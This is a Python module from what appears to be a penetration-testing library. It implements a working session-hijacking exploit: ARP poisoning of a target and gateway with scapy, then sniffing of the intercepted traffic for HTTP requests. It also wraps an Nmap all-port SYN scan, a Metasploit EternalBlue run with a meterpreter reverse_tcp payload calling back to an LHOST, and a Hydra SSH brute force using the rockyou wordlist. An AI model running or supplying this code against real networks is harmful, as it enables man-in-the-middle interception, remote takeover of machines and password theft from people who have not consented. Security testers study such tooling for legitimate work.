# wireless_pen_test_lib/exploits/session_hijacking.py

import time
import threading
import logging
from scapy.all import send, sr, conf, sniff
import subprocess
from scapy.layers.l2 import Ether, ARP
import os
import signal
import multiprocessing
import json
import datetime
from jinja2 import Environment, FileSystemLoader

from core import CoreFramework  # Ensure this is an absolute import
from base_exploit import BaseExploit  # Ensure this is an absolute import


class SessionHijacking(BaseExploit):
    """
    A class to perform session hijacking via ARP spoofing with advanced automation features.
    """

    def __init__(self, core_framework, vulnerability, max_packets: int = 100, interval: float = 2.0,
                 capture_file: str = "capture.pcap", filter_expression: str = None, real_time: bool = False):
        """
        Initialize the SessionHijacking exploit.

        Args:
            core_framework: The core framework instance.
            vulnerability (dict): Information about the vulnerability, including target and gateway IPs.
            max_packets (int): Maximum number of spoofed ARP packets to send.
            interval (float): Time interval between sending ARP spoofing packets in seconds.
            capture_file (str): File path to save captured packets.
            filter_expression (str): BPF filter expression for packet capturing.
            real_time (bool): Whether to process packets in real-time.
        """
        super().__init__(core_framework, vulnerability)
        self.max_packets = max_packets
        self.interval = interval
        self.capture_file = capture_file
        self.filter_expression = filter_expression or f"host {self.vulnerability.get('target_ip')} and host {self.vulnerability.get('gateway_ip')}"
        self.real_time = real_time
        self.analysis_results = []
        self.stop_event = multiprocessing.Event()
        self.processes = []
        self.logger = logging.getLogger(self.__class__.__name__)

        # Extract necessary information from vulnerability dict
        self.target_ip = self.vulnerability.get('target_ip')
        self.gateway_ip = self.vulnerability.get('gateway_ip')
        self.interface = self.core.packet_handler.packet_injector.interface

        if not self.target_ip or not self.gateway_ip:
            self.logger.error("Both target_ip and gateway_ip must be specified in vulnerability info.")
            raise ValueError("Missing target_ip or gateway_ip in vulnerability info.")

        self.target_mac = None
        self.gateway_mac = None

        # Initialize multiprocessing manager for shared data
        self.manager = multiprocessing.Manager()
        self.analysis_results = self.manager.list()

    def execute(self):
        """
        Execute the session hijacking exploit and start monitoring.

        Returns:
            dict: Status of the exploit execution with detected vulnerabilities.
        """
        self.logger.info(f"Starting Session Hijacking on target IP: {self.target_ip}")
        try:
            # Ensure the interface is in monitor mode
            self._ensure_monitor_mode()

            # Resolve MAC addresses
            self.target_mac = self._get_mac(self.target_ip)
            self.gateway_mac = self._get_mac(self.gateway_ip)

            if not self.target_mac:
                self.logger.error(f"Could not resolve MAC address for target IP: {self.target_ip}")
                return {"status": "error", "message": f"Could not resolve MAC address for target IP: {self.target_ip}"}

            if not self.gateway_mac:
                self.logger.error(f"Could not resolve MAC address for gateway IP: {self.gateway_ip}")
                return {"status": "error", "message": f"Could not resolve MAC address for gateway IP: {self.gateway_ip}"}

            self.logger.debug(f"Target MAC: {self.target_mac}, Gateway MAC: {self.gateway_mac}")

            # Start ARP spoofing process
            arp_process = multiprocessing.Process(target=self._arp_spoof, daemon=True)
            arp_process.start()
            self.processes.append(arp_process)
            self.logger.debug(f"ARP spoofing process started with PID: {arp_process.pid}")

            if self.real_time:
                # Start real-time packet processing process
                real_time_process = multiprocessing.Process(target=self._real_time_packet_processing, daemon=True)
                real_time_process.start()
                self.processes.append(real_time_process)
                self.logger.debug(f"Real-time packet processing started with PID: {real_time_process.pid}")
            else:
                # Start tcpdump monitoring process
                monitor_process = multiprocessing.Process(target=self._start_monitoring, daemon=True)
                monitor_process.start()
                self.processes.append(monitor_process)
                self.logger.debug(f"tcpdump monitoring process started with PID: {monitor_process.pid}")

            # Start process monitoring thread
            monitor_thread = threading.Thread(target=self._monitor_processes, daemon=True)
            monitor_thread.start()

            self.logger.info("Session Hijacking exploit and monitoring initiated.")
            return {"status": "success"}

        except Exception as e:
            self.logger.exception(f"Failed to execute Session Hijacking exploit: {e}")
            self.cleanup()
            return {"status": "error", "message": str(e)}

    def _arp_spoof(self):
        """
        Continuously send spoofed ARP replies to the target and gateway to perform ARP poisoning.
        """
        self.logger.info("Starting ARP spoofing.")
        try:
            count = 0
            while not self.stop_event.is_set() and count < self.max_packets:
                # Tell the target that we are the gateway
                spoof_target = ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                                   hwdst=self.target_mac, hwsrc=self.core.packet_handler.packet_injector.get_interface_mac())
                # Tell the gateway that we are the target
                spoof_gateway = ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                                    hwdst=self.gateway_mac, hwsrc=self.core.packet_handler.packet_injector.get_interface_mac())

                send(spoof_target, iface=self.interface, verbose=False)
                send(spoof_gateway, iface=self.interface, verbose=False)

                self.logger.debug(f"Sent spoofed ARP packets: {count+1}/{self.max_packets}")
                count += 1
                time.sleep(self.interval)
        except Exception as e:
            self.logger.exception(f"Error during ARP spoofing: {e}")
            self.stop_event.set()

    def _real_time_packet_processing(self):
        """
        Captures and processes packets in real-time using Scapy.
        """
        self.logger.info("Starting real-time packet processing with Scapy.")
        try:
            # Define the filter for Scapy's sniff
            scapy_filter = self.filter_expression

            sniff(
                iface=self.interface,
                filter=scapy_filter,
                prn=self._process_packet,
                store=False,
                stop_filter=lambda x: self.stop_event.is_set()
            )
        except Exception as e:
            self.logger.exception(f"Real-time packet processing failed: {e}")
            self.stop_event.set()

    def _process_packet(self, packet):
        """
        Callback function to process each captured packet.
        """
        self.logger.debug(f"Processing packet: {packet.summary()}")

        # Example: Detect HTTP GET requests and extract URLs
        if packet.haslayer("TCP") and packet.haslayer("Raw"):
            try:
                payload = packet["Raw"].load.decode('utf-8', errors='ignore')
                if "GET" in payload:
                    # Simple extraction of the requested URL
                    request_line = payload.split('\r\n')[0]
                    method, url, _ = request_line.split()
                    self.logger.info(f"Detected HTTP GET request for URL: {url}")
                    self.analysis_results.append({'type': 'HTTP_GET', 'url': url})
            except Exception as e:
                self.logger.debug(f"Failed to parse HTTP GET request: {e}")

        # Additional processing can be implemented here

    def _start_monitoring(self):
        """
        Starts the packet capturing process using tcpdump.
        """
        self.logger.info("Starting network traffic monitoring with tcpdump.")
        try:
            # Ensure the capture file does not already exist
            if os.path.exists(self.capture_file):
                os.remove(self.capture_file)

            # Build the tcpdump command
            cmd = [
                'tcpdump',
                '-i', self.interface,
                '-w', self.capture_file,
                '-s', '0',  # Capture the entire packet
                self.filter_expression
            ]

            # Start tcpdump as a subprocess
            self.monitor_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.debug(f"tcpdump started with PID: {self.monitor_process.pid}")

            # Allow tcpdump some time to initialize
            time.sleep(2)
            if self.monitor_process.poll() is not None:
                self.logger.error("tcpdump failed to start.")
                raise RuntimeError("tcpdump failed to start.")

            self.logger.info(f"Packet capturing started with filter '{self.filter_expression}'. Saving to {self.capture_file}")

            while not self.stop_event.is_set():
                time.sleep(1)

        except Exception as e:
            self.logger.exception(f"Failed to start network monitoring: {e}")
            self.stop_event.set()

    def _monitor_processes(self):
        """
        Monitors the health of child processes and handles any unexpected terminations.
        """
        self.logger.info("Starting to monitor child processes.")
        try:
            while not self.stop_event.is_set():
                for process in self.processes:
                    if not process.is_alive():
                        self.logger.warning(f"Process PID {process.pid} has terminated unexpectedly.")
                        # Optionally, restart the process or take other actions
                        # For simplicity, initiate cleanup
                        self.stop_event.set()
                        self.cleanup()
                        break
                time.sleep(5)  # Check every 5 seconds
        except Exception as e:
            self.logger.exception(f"Error in process monitoring: {e}")
            self.stop_event.set()
            self.cleanup()

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment and stop monitoring.
        """
        self.logger.info("Cleaning up Session Hijacking exploit.")

        # Signal all processes to stop
        self.stop_event.set()

        # Terminate all child processes
        for process in self.processes:
            if process.is_alive():
                process.terminate()
                process.join(timeout=5)
                if process.is_alive():
                    self.logger.warning(f"Process PID {process.pid} did not terminate gracefully. Killing it.")
                    process.kill()
                    process.join()
                self.logger.debug(f"Process PID {process.pid} has been terminated.")

        # Restore ARP tables if not using real-time processing
        if not self.real_time:
            self._restore_arp()

        # Reset interface to managed mode if it was changed
        self._reset_interface()

        # Generate report
        self.generate_report()

        self.logger.info("Session Hijacking exploit and monitoring stopped.")

    def _restore_arp(self):
        """
        Restore the normal ARP tables by sending correct ARP replies.
        """
        self.logger.info("Restoring ARP tables.")
        try:
            # Send the correct ARP information to the target and gateway
            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=self.target_mac, hwdst="ff:ff:ff:ff:ff:ff"),
                 count=5, iface=self.interface, verbose=False)
            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=self.gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"),
                 count=5, iface=self.interface, verbose=False)
            self.logger.info("ARP tables restored successfully.")
        except Exception as e:
            self.logger.exception(f"Failed to restore ARP tables: {e}")

    def _reset_interface(self):
        """
        Reset the network interface to managed mode if it was changed.
        """
        try:
            mode = self.core.packet_handler.packet_injector.get_interface_mode()
            if mode == 'monitor':
                self.logger.info(f"Setting interface {self.interface} back to managed mode.")
                subprocess.check_call(['airmon-ng', 'stop', self.interface],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.logger.info(f"Interface {self.interface} set back to managed mode.")
            else:
                self.logger.debug(f"Interface {self.interface} is already in managed mode.")
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Failed to reset interface {self.interface} to managed mode: {e}")
        except Exception as e:
            self.logger.exception(f"Unexpected error while resetting interface: {e}")

    def generate_report(self, report_file: str = "session_hijack_report.json"):
        """
        Generates a comprehensive JSON report of the findings.

        Args:
            report_file (str): Path to save the report file.
        """
        self.logger.info(f"Generating report: {report_file}")
        try:
            report_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'vulnerability_info': self.vulnerability,
                'analysis_results': list(self.analysis_results),
                'interface': self.interface,
                'capture_file': self.capture_file if not self.real_time else "Real-time processing enabled",
            }

            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=4)

            self.logger.info(f"Report generated successfully at {report_file}")
        except Exception as e:
            self.logger.exception(f"Failed to generate report: {e}")

    def generate_html_report(self, template_file: str = "report_template.html", report_file: str = "session_hijack_report.html"):
        """
        Generates a comprehensive HTML report of the findings using a Jinja2 template.

        Args:
            template_file (str): Path to the HTML template file.
            report_file (str): Path to save the HTML report file.
        """
        self.logger.info(f"Generating HTML report: {report_file}")
        try:
            # Setup Jinja2 environment
            env = Environment(loader=FileSystemLoader('.'))
            template = env.get_template(template_file)

            report_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'vulnerability_info': self.vulnerability,
                'analysis_results': list(self.analysis_results),
                'interface': self.interface,
                'capture_file': self.capture_file if not self.real_time else "Real-time processing enabled",
            }

            # Render the template with data
            report_html = template.render(report_data)

            # Save the report
            with open(report_file, 'w') as f:
                f.write(report_html)

            self.logger.info(f"HTML report generated successfully at {report_file}")
        except Exception as e:
            self.logger.exception(f"Failed to generate HTML report: {e}")

    def perform_network_scan(self, scan_file: str = "nmap_scan.xml"):
        """
        Performs an Nmap scan on the target IP and saves the results.

        Args:
            scan_file (str): Path to save the Nmap scan results.
        """
        self.logger.info(f"Starting Nmap scan on {self.target_ip}")
        try:
            cmd = [
                'nmap',
                '-sS',                # SYN scan
                '-O',                 # OS detection
                '-p-',                # Scan all ports
                '-oX', scan_file,     # Output in XML format
                self.target_ip
            ]
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Nmap scan completed. Results saved to {scan_file}")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Nmap scan failed: {e}")
        except Exception as e:
            self.logger.exception(f"Unexpected error during Nmap scan: {e}")

    def perform_metasploit_exploit(self, module: str, payload: str, lhost: str, lport: int, output_file: str = "metasploit_output.txt"):
        """
        Executes a Metasploit module with specified parameters.

        Args:
            module (str): Metasploit module path.
            payload (str): Payload to use.
            lhost (str): Local host IP for payload.
            lport (int): Local port for payload.
            output_file (str): Path to save Metasploit output.
        """
        self.logger.info(f"Starting Metasploit exploit using module {module}")
        try:
            cmd = [
                'msfconsole',
                '-q',  # Quiet mode
                '-x', f"use {module}; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit; exit"
            ]
            with open(output_file, 'w') as f:
                subprocess.run(cmd, check=True, stdout=f, stderr=subprocess.STDOUT)
            self.logger.info(f"Metasploit exploit completed. Output saved to {output_file}")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Metasploit exploit failed: {e}")
        except Exception as e:
            self.logger.exception(f"Unexpected error during Metasploit exploit: {e}")

    def perform_hydra_attack(self, service: str, username: str, password_file: str, target_ip: str, output_file: str = "hydra_output.txt"):
        """
        Executes a Hydra brute-force attack on a specified service.

        Args:
            service (str): Service to target (e.g., ssh, ftp).
            username (str): Username to target.
            password_file (str): Path to password list file.
            target_ip (str): IP address of the target.
            output_file (str): Path to save Hydra output.
        """
        self.logger.info(f"Starting Hydra attack on {service} service at {target_ip}")
        try:
            cmd = [
                'hydra',
                '-l', username,
                '-P', password_file,
                service,
                target_ip,
                '-o', output_file
            ]
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Hydra attack completed. Results saved to {output_file}")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Hydra attack failed: {e}")
        except Exception as e:
            self.logger.exception(f"Unexpected error during Hydra attack: {e}")



def main():
    # Configure logging
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    # Define fake vulnerability information
    vulnerability_info = {
        'target_ip': '192.168.1.10',
        'gateway_ip': '192.168.1.1',
        'channel': 6
    }

    # Define custom filter expression (optional)
    custom_filter = "tcp port 80"  # Example: Capture only HTTP traffic

    # Initialize core framework with mock implementation
    core = CoreFramework(modules_path=".", interface='wlan0')

    # Initialize the exploit with fake test data
    exploit = SessionHijacking(
        core_framework=core,
        vulnerability=vulnerability_info,
        max_packets=5,  # Reduced number for testing
        interval=1.0,   # Short interval for testing
        capture_file="session_hijack_capture.pcap",
        filter_expression=custom_filter,
        real_time=True
    )

    # Execute the exploit
    result = exploit.execute()
    print(result)

    if result.get("status") != "success":
        print("Exploit failed to start. Exiting.")
        return

    # Run the exploit and monitoring for a short duration (e.g., 10 seconds for testing)
    try:
        run_duration = 10  # seconds
        start_time = time.time()
        while (time.time() - start_time) < run_duration:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Interrupted by user.")

    # Cleanup after the attack
    exploit.cleanup()

    print("Session Hijacking and monitoring completed.")

    # Perform additional mock actions post-exploit
    exploit.perform_network_scan(scan_file="nmap_scan.xml")
    exploit.perform_metasploit_exploit(
        module="exploit/windows/smb/ms17_010_eternalblue",
        payload="windows/meterpreter/reverse_tcp",
        lhost="192.168.1.100",
        lport=4444,
        output_file="metasploit_eternalblue.txt"
    )
    exploit.perform_hydra_attack(
        service="ssh",
        username="admin",
        password_file="/usr/share/wordlists/rockyou.txt",
        target_ip="192.168.1.10",
        output_file="hydra_ssh.txt"
    )

    # Generate reports
    exploit.generate_report("final_session_hijack_report.json")
    exploit.generate_html_report(template_file="report_template.html", report_file="final_session_hijack_report.html")

    print("Network scan, exploits, and reporting completed.")


if __name__ == "__main__":
    main()